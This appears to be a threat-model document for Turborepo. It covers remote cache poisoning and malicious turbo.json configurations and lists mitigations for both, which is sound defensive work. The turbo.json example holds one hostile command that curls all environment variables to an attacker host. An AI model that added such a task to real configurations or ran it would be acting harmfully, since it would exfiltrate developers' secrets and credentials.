# Attack Surface Analysis for vercel/turborepo

## Attack Surface: [Remote Cache Poisoning](./attack_surfaces/remote_cache_poisoning.md)

*   **1. Remote Cache Poisoning**

    *   **Description:** An attacker gains unauthorized access to the remote cache and replaces legitimate build artifacts with malicious ones.
    *   **How Turborepo Contributes:** Turborepo's *remote caching feature* is the direct mechanism enabling this attack. The feature's design and implementation are central to the vulnerability.
    *   **Example:** An attacker compromises the AWS S3 bucket used for remote caching and replaces a compiled JavaScript library with a version containing a backdoor. Subsequent builds by all developers using the cache will include the backdoor.
    *   **Impact:** Widespread compromise of applications built using the poisoned cache. Could lead to data breaches, code execution on user machines, and complete system compromise.
    *   **Risk Severity:** Critical
    *   **Mitigation Strategies:**
        *   **Strong Authentication & Authorization:** Use short-lived, tightly scoped IAM roles/credentials for the remote cache provider (e.g., AWS, Vercel). Implement the principle of least privilege.
        *   **Secrets Management:** Store and manage cache credentials securely using a secrets manager (e.g., HashiCorp Vault, AWS Secrets Manager). Rotate credentials regularly.
        *   **Network Security:** Ensure secure communication (HTTPS) with the remote cache. Consider network segmentation to limit access to the cache.
        *   **Monitoring & Alerting:** Implement monitoring and alerting for suspicious activity on the remote cache (e.g., unusual access patterns, large file modifications).
        *   **Cache Verification (Ideal):** Advocate for and utilize (if available) features that verify the integrity of cached artifacts beyond just hashing (e.g., digital signatures).

## Attack Surface: [Malicious `turbo.json` Configuration](./attack_surfaces/malicious__turbo_json__configuration.md)

*   **2. Malicious `turbo.json` Configuration**

    *   **Description:** An attacker modifies the `turbo.json` file to execute arbitrary commands or alter the build process in a harmful way.
    *   **How Turborepo Contributes:** `turbo.json` is the *core configuration file* interpreted and acted upon *directly by Turborepo*. The vulnerability lies in Turborepo's execution of potentially malicious commands defined within this file.
    *   **Example:** An attacker adds a task to `turbo.json` that runs a malicious script during the build process, exfiltrating environment variables or installing malware. For instance: `"exfiltrate": "curl -X POST -d \"$(env)\" https://attacker.com/data"`.
    *   **Impact:** Compromise of the build environment, potential for code execution on developer machines, and exfiltration of sensitive data.
    *   **Risk Severity:** High
    *   **Mitigation Strategies:**
        *   **Strict Code Review:** Mandate thorough code reviews for *all* changes to `turbo.json`, focusing on task definitions and dependencies. Use a pull request/merge request workflow.
        *   **Repository Security:** Implement strong repository security measures (e.g., branch protection rules, multi-factor authentication for repository access).
        *   **Input Validation (Ideal):** Turborepo could implement stricter validation of the `turbo.json` schema to prevent dangerous configurations.
        *   **Least Privilege (Build Environment):** Run build processes with the least necessary privileges. Avoid running builds as root or with overly broad permissions.
